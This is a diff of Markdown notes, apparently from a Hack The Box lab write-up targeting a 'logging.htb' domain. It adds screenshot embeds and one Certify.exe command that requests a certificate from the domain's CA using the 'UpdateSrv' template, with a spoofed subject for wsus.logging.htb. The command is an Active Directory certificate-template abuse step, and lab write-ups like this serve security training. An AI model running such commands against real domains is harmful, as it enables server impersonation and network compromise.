@@ -124,7 +124,15 @@
 
 ![](Attachments/Pasted%20image%2020260428192539.png)
 
-![](Attachments/Pasted%20image%2020260428192553.png)
+![](Attachments/Pasted%20image%2020260429000818.png)
+
+Certify.exe request /ca:"DC01.logging.htb\logging-DC01-CA" /template:"UpdateSrv" /subject:"CN=wsus.logging.htb" /dns:"wsus.logging.htb"
+
+![](Attachments/Pasted%20image%2020260429000605.png)
+
+![](Attachments/Pasted%20image%2020260429000445.png)
+
+![](Attachments/Pasted%20image%2020260429000906.png)
 
 
 
